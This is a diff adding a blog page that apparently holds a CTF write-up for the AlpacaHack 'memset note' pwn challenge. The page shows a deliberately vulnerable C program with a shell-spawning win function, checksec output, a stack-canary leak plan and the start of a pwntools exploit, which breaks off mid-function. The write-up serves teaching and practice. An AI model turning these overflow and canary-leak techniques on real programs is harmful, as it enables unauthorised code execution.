@@ -1,0 +1,236 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Liste - https://nothoudaifa.github.io/">
+    <title>memset not chall from Alpacahack B-Side writeup | nothoudaifa</title>
+    <meta name="description" content="I talk about computer stuff.">
+    <meta property="og:url" content="https://nothoudaifa.github.io/posts/alpaca-bside-memsetnote/">
+	<meta property="og:site_name" content="nothoudaifa">
+	<meta property="og:title" content="memset not chall from Alpacahack B-Side writeup">
+	<meta property="og:description" content="Initial Analysis we are given this source code of the binary:
+// gcc -o chal main.c -fno-pie -no-pie #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; void win() { execve(&#34;/bin/sh&#34;, NULL, NULL); } int main(void) { unsigned n = 0; char c = 0; char buf[100] = {0}; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); while (1) { printf(&#34;size &gt; &#34;); scanf(&#34;%u&#34;, &amp;n); if (n == 0) break; printf(&#34;char &gt; &#34;); scanf(&#34; %c&#34;, &amp;c); memset(buf, c, n); puts(buf); } return 0; } there is a buffer overflow in the memset function since we can set an arbitrary size n and use it to memset beyond buf into the return address, and there is also a win function we can redirect execution flow into.">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-07-01T00:00:00+00:00">
+		<meta property="article:modified_time" content="2026-07-01T00:00:00+00:00">
+		<meta property="article:tag" content="Ctf">
+		<meta property="article:tag" content="Pwn">
+
+    
+	<meta itemprop="name" content="memset not chall from Alpacahack B-Side writeup">
+	<meta itemprop="description" content="Initial Analysis we are given this source code of the binary:
+// gcc -o chal main.c -fno-pie -no-pie #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; void win() { execve(&#34;/bin/sh&#34;, NULL, NULL); } int main(void) { unsigned n = 0; char c = 0; char buf[100] = {0}; setbuf(stdin, NULL); setbuf(stdout, NULL); setbuf(stderr, NULL); while (1) { printf(&#34;size &gt; &#34;); scanf(&#34;%u&#34;, &amp;n); if (n == 0) break; printf(&#34;char &gt; &#34;); scanf(&#34; %c&#34;, &amp;c); memset(buf, c, n); puts(buf); } return 0; } there is a buffer overflow in the memset function since we can set an arbitrary size n and use it to memset beyond buf into the return address, and there is also a win function we can redirect execution flow into.">
+	<meta itemprop="datePublished" content="2026-07-01T00:00:00+00:00">
+	<meta itemprop="dateModified" content="2026-07-01T00:00:00+00:00">
+	<meta itemprop="wordCount" content="477">
+	<meta itemprop="keywords" content="Ctf,Pwn">
+    
+    <link rel="canonical" href="https://nothoudaifa.github.io/posts/alpaca-bside-memsetnote/">
+    <link rel="icon" href="https://nothoudaifa.github.io//assets/favicon.ico">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link href="https://www.google-analytics.com" rel="preconnect" crossorigin>
+    <link rel="alternate" type="application/atom+xml" title="nothoudaifa" href="https://nothoudaifa.github.io//atom.xml" />
+    <link rel="alternate" type="application/json" title="nothoudaifa" href="https://nothoudaifa.github.io//feed.json" />
+    <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Bricolage+Grotesque">
+    
+    
+    <style>*,:after,:before{box-sizing:border-box;padding:0}body{font:1rem/1.5 bricolage grotesque,-apple-system,BlinkMacSystemFont,segoe ui,Helvetica,Arial,sans-serif;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;padding:2rem;background:#fffdfa;color:#000}.skip-link{position:absolute;top:-40px;left:0;background:#eee;z-index:100}.skip-link:focus{top:0}header{line-height:2;padding-bottom:1.5rem}.link{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-decoration:none}.time{font-variant-numeric:tabular-nums;white-space:nowrap}blockquote{border-left:5px solid #eee;padding-left:1rem;margin:0}a,a:visited{color:inherit}a:hover,a.heading-link{text-decoration:none}pre{padding:.5rem;overflow:auto;overflow-x:scroll;overflow-wrap:normal}code,pre{font-family:San Francisco Mono,Monaco,consolas,lucida console,dejavu sans mono,bitstream vera sans mono,monospace;font-size:normal;font-size:small;background:#eee}code{margin:.1rem;border:none;overflow:visible;overflow-wrap:anywhere}ul{list-style-type:square}ul,ol{padding-left:1.2rem}.list{line-height:2;list-style-type:none;padding-left:0}.list li{padding-bottom:.1rem}.meta{color:#777}.content{max-width:70ch;margin:0 auto}header{line-height:2;display:flex;justify-content:space-between;padding-bottom:1rem}header a{text-decoration:none}header ul{list-style-type:none;padding:0}header li,header a{display:inline}h2.post{padding-top:.5rem}header ul a:first-child{padding-left:1rem}.nav{height:1px;background:#000;content:'';max-width:10%}.list li{display:flex;align-items:baseline}.list li time{flex:initial}.hr-list{margin-top:0;margin-bottom:0;margin-right:.5rem;margin-left:.5rem;height:1px;border:0;border-bottom:1px dotted #ccc;flex:1 0 1rem}.m,hr{border:0;margin:3rem 0}img{max-width:100%;height:auto}.post-date{margin:5% 0}.index-date{color:#9a9a9a}.animate-blink{animation:opacity 1s infinite;opacity:1}@keyframes opacity{0%{opacity:1}50%{opacity:.5}100%{opacity:0}}.tags{display:flex;justify-content:space-between}.tags ul{padding:0;margin:0}.tags li{display:inline}.avatar{height:120px;width:120px;position:relative;margin:-10px 0 0 15px;float:right;border-radius:50%}table{width:100%;border-collapse:collapse}th,td{border:1px solid #ddd;text-align:left;padding:8px}th{background-color:#f2f2f2} </style>
+  
+    
+  
+  
+  <script type="application/ld+json">
+  {
+      "@context": "http://schema.org",
+      "@type": "BlogPosting",
+      "articleSection": "posts",
+      "name": "memset not chall from Alpacahack B-Side writeup",
+      "headline": "memset not chall from Alpacahack B-Side writeup",
+      "alternativeHeadline": "",
+      "description": "\u003ch2 id=\u0022initial-analysis\u0022\u003eInitial Analysis\u003c\/h2\u003e\n\u003cp\u003ewe are given this source code of the binary:\u003c\/p\u003e\n\u003cdiv class=\u0022highlight\u0022\u003e\u003cpre tabindex=\u00220\u0022 style=\u0022color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;\u0022\u003e\u003ccode class=\u0022language-c\u0022 data-lang=\u0022c\u0022\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e\/\/ gcc -o chal main.c -fno-pie -no-pie\n\u003c\/span\u003e\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e#include\u003c\/span\u003e \u003cspan style=\u0022color:#75715e\u0022\u003e\u0026lt;stdio.h\u0026gt;\u003c\/span\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e#include\u003c\/span\u003e \u003cspan style=\u0022color:#75715e\u0022\u003e\u0026lt;string.h\u0026gt;\u003c\/span\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e#include\u003c\/span\u003e \u003cspan style=\u0022color:#75715e\u0022\u003e\u0026lt;unistd.h\u0026gt;\u003c\/span\u003e\u003cspan style=\u0022color:#75715e\u0022\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#00a8c8\u0022\u003evoid\u003c\/span\u003e \u003cspan style=\u0022color:#75af00\u0022\u003ewin\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e()\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003e{\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#75af00\u0022\u003eexecve\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#d88200\u0022\u003e\u0026#34;\/bin\/sh\u0026#34;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003eNULL\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003eNULL\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#111\u0022\u003e}\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#00a8c8\u0022\u003eint\u003c\/span\u003e \u003cspan style=\u0022color:#75af00\u0022\u003emain\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#00a8c8\u0022\u003evoid\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e)\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003e{\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#00a8c8\u0022\u003eunsigned\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003en\u003c\/span\u003e \u003cspan style=\u0022color:#f92672\u0022\u003e=\u003c\/span\u003e \u003cspan style=\u0022color:#ae81ff\u0022\u003e0\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e;\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#00a8c8\u0022\u003echar\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003ec\u003c\/span\u003e \u003cspan style=\u0022color:#f92672\u0022\u003e=\u003c\/span\u003e \u003cspan style=\u0022color:#ae81ff\u0022\u003e0\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e;\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#00a8c8\u0022\u003echar\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003ebuf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e[\u003c\/span\u003e\u003cspan style=\u0022color:#ae81ff\u0022\u003e100\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e]\u003c\/span\u003e \u003cspan style=\u0022color:#f92672\u0022\u003e=\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003e{\u003c\/span\u003e\u003cspan style=\u0022color:#ae81ff\u0022\u003e0\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e};\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#75af00\u0022\u003esetbuf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003estdin\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003eNULL\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#75af00\u0022\u003esetbuf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003estdout\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003eNULL\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#75af00\u0022\u003esetbuf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003estderr\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003eNULL\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#00a8c8\u0022\u003ewhile\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#ae81ff\u0022\u003e1\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e)\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003e{\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#75af00\u0022\u003eprintf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#d88200\u0022\u003e\u0026#34;size \u0026gt; \u0026#34;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#75af00\u0022\u003escanf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#d88200\u0022\u003e\u0026#34;%u\u0026#34;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#f92672\u0022\u003e\u0026amp;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003en\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#00a8c8\u0022\u003eif\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003en\u003c\/span\u003e \u003cspan style=\u0022color:#f92672\u0022\u003e==\u003c\/span\u003e \u003cspan style=\u0022color:#ae81ff\u0022\u003e0\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e)\u003c\/span\u003e \u003cspan style=\u0022color:#00a8c8\u0022\u003ebreak\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e;\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#75af00\u0022\u003eprintf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#d88200\u0022\u003e\u0026#34;char \u0026gt; \u0026#34;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#75af00\u0022\u003escanf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#d88200\u0022\u003e\u0026#34; %c\u0026#34;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#f92672\u0022\u003e\u0026amp;\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003ec\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#75af00\u0022\u003ememset\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003ebuf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003ec\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e,\u003c\/span\u003e \u003cspan style=\u0022color:#111\u0022\u003en\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e        \u003cspan style=\u0022color:#75af00\u0022\u003eputs\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e(\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003ebuf\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e);\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#111\u0022\u003e}\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e    \u003cspan style=\u0022color:#00a8c8\u0022\u003ereturn\u003c\/span\u003e \u003cspan style=\u0022color:#ae81ff\u0022\u003e0\u003c\/span\u003e\u003cspan style=\u0022color:#111\u0022\u003e;\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003cspan style=\u0022display:flex;\u0022\u003e\u003cspan\u003e\u003cspan style=\u0022color:#111\u0022\u003e}\u003c\/span\u003e\n\u003c\/span\u003e\u003c\/span\u003e\u003c\/code\u003e\u003c\/pre\u003e\u003c\/div\u003e\u003cp\u003ethere is a buffer overflow in the memset function since we can set an arbitrary size n and use it to memset beyond \u003ccode\u003ebuf\u003c\/code\u003e into the return address, and there is also a win function we can redirect execution flow into.\u003c\/p\u003e",
+      "inLanguage": "en-us",
+      "isFamilyFriendly": "true",
+      "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https:\/\/nothoudaifa.github.io\/posts\/alpaca-bside-memsetnote\/"
+      },
+      "author" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "creator" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "accountablePerson" : {
+          "@type": "Person",
+          "name": "nothoudaifa"
+      },
+      "copyrightHolder" : "nothoudaifa",
+      "copyrightYear" : "2026",
+      "dateCreated": "2026-07-01T00:00:00.00Z",
+      "datePublished": "2026-07-01T00:00:00.00Z",
+      "dateModified": "2026-07-01T00:00:00.00Z",
+      "publisher":{
+          "@type":"Organization",
+          "name": "nothoudaifa",
+          "url": "https://nothoudaifa.github.io/",
+          "logo": {
+              "@type": "ImageObject",
+              "url": "https:\/\/nothoudaifa.github.io\/assets\/favicon.ico",
+              "width":"32",
+              "height":"32"
+          }
+      },
+      "image": "https://nothoudaifa.github.io/assets/favicon.ico",
+      "url" : "https:\/\/nothoudaifa.github.io\/posts\/alpaca-bside-memsetnote\/",
+      "wordCount" : "477",
+      "genre" : [ "ctf" , "pwn" ],
+      "keywords" : [ "ctf" , "pwn" ]
+  }
+  </script>
+  
+  
+  </head>
+
+<body>
+  <a class="skip-link" href="#main">Skip to main</a>
+  <main id="main">
+  <div class="content">
+    <header>
+<p style="padding: 0;margin: 0;">
+  <a href="https://nothoudaifa.github.io/">
+    <b>nothoudaifa</b>
+    <span class="text-stone-500 animate-blink">▮</span>
+  </a>
+</p>
+<ul style="padding: 0;margin: 0;">
+  
+  
+  <li class="">
+    <a href="/posts/"><span>Posts</span></a>
+    
+  <li class="">
+    <a href="/about/"><span>About</span></a>
+    
+  </li>
+</ul>
+</header>
+<hr class="hr-list" style="padding: 0;margin: 0;">
+    <section>
+      <h2 class="post">memset not chall from Alpacahack B-Side writeup</h2>
+      <h2 id="initial-analysis">Initial Analysis</h2>
+<p>we are given this source code of the binary:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// gcc -o chal main.c -fno-pie -no-pie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">void</span> <span style="color:#75af00">win</span><span style="color:#111">()</span> <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">execve</span><span style="color:#111">(</span><span style="color:#d88200">&#34;/bin/sh&#34;</span><span style="color:#111">,</span> <span style="color:#111">NULL</span><span style="color:#111">,</span> <span style="color:#111">NULL</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">int</span> <span style="color:#75af00">main</span><span style="color:#111">(</span><span style="color:#00a8c8">void</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">unsigned</span> <span style="color:#111">n</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">char</span> <span style="color:#111">c</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">char</span> <span style="color:#111">buf</span><span style="color:#111">[</span><span style="color:#ae81ff">100</span><span style="color:#111">]</span> <span style="color:#f92672">=</span> <span style="color:#111">{</span><span style="color:#ae81ff">0</span><span style="color:#111">};</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">setbuf</span><span style="color:#111">(</span><span style="color:#111">stdin</span><span style="color:#111">,</span> <span style="color:#111">NULL</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">setbuf</span><span style="color:#111">(</span><span style="color:#111">stdout</span><span style="color:#111">,</span> <span style="color:#111">NULL</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75af00">setbuf</span><span style="color:#111">(</span><span style="color:#111">stderr</span><span style="color:#111">,</span> <span style="color:#111">NULL</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">while</span> <span style="color:#111">(</span><span style="color:#ae81ff">1</span><span style="color:#111">)</span> <span style="color:#111">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75af00">printf</span><span style="color:#111">(</span><span style="color:#d88200">&#34;size &gt; &#34;</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75af00">scanf</span><span style="color:#111">(</span><span style="color:#d88200">&#34;%u&#34;</span><span style="color:#111">,</span> <span style="color:#f92672">&amp;</span><span style="color:#111">n</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00a8c8">if</span> <span style="color:#111">(</span><span style="color:#111">n</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span><span style="color:#111">)</span> <span style="color:#00a8c8">break</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75af00">printf</span><span style="color:#111">(</span><span style="color:#d88200">&#34;char &gt; &#34;</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75af00">scanf</span><span style="color:#111">(</span><span style="color:#d88200">&#34; %c&#34;</span><span style="color:#111">,</span> <span style="color:#f92672">&amp;</span><span style="color:#111">c</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75af00">memset</span><span style="color:#111">(</span><span style="color:#111">buf</span><span style="color:#111">,</span> <span style="color:#111">c</span><span style="color:#111">,</span> <span style="color:#111">n</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75af00">puts</span><span style="color:#111">(</span><span style="color:#111">buf</span><span style="color:#111">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00a8c8">return</span> <span style="color:#ae81ff">0</span><span style="color:#111">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">}</span>
+</span></span></code></pre></div><p>there is a buffer overflow in the memset function since we can set an arbitrary size n and use it to memset beyond <code>buf</code> into the return address, and there is also a win function we can redirect execution flow into.</p>
+<p>running <code>checksec</code> on the binary we can see that stack canary is enabled and pie is disabled:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ checksec ./chal
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#d88200">&#39;/home/player/ctfs/alpaca/memset-note/chal&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:       amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:      Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:      Canary found
+</span></span><span style="display:flex;"><span>    NX:         NX enabled
+</span></span><span style="display:flex;"><span>    PIE:        No PIE <span style="color:#f92672">(</span>0x400000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    SHSTK:      Enabled
+</span></span><span style="display:flex;"><span>    IBT:        Enabled
+</span></span><span style="display:flex;"><span>    Stripped:   No
+</span></span></code></pre></div><h2 id="exploitation">Exploitation</h2>
+<p>first things first we need to leak the canary, there is a <code>puts(buf)</code> after we do the memset, so we can fill all the memory from <code>buf</code> to <code>address of the canary</code> with A&rsquo;s and then puts will print the our buf and the canary, note that we need to also write in the first byte of the canary since it&rsquo;s always 0, it&rsquo;s used to terminate strings in case a non-null terminated buffer is situated just before the canary is printed so it cannot leak the canary</p>
+<p>we can use something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> <span style="color:#111">pwn</span> <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#111">p</span> <span style="color:#f92672">=</span> <span style="color:#111">process</span><span style="color:#111">(</span><span style="color:#d88200">&#34;./chal&#34;</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00a8c8">def</span> <span style="color:#75af00">snd</span><span style="color:#111">(</span><span style="color:#111">sz</span><span style="color:#111">,</span> <span style="color:#111">c</span><span style="color:#111">):</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">sendlineafter</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;size &gt;&#39;</span><span style="color:#111">,</span> <span style="color:#111">str</span><span style="color:#111">(</span><span style="color:#111">sz</span><span style="color:#111">)</span><span style="color:#f92672">.</span><span style="color:#111">encode</span><span style="color:#111">())</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#111">p</span><span style="color:#f92672">.</span><span style="color:#111">sendlineafter</span><span style="color:#111">(</span><span style="color:#d88200">b</span><span style="color:#d88200">&#39;char &gt;&#39;</span><span style="color:#111">,</span> <span style="color:#d88200">b</span><span style="color:#d88200">&#39; &#39;</span><span style="color:#f92672">+</span><span style="color:#111">c</span><span style="color:#111">)</span>
+</span></span><span style="display:flex;"><span>
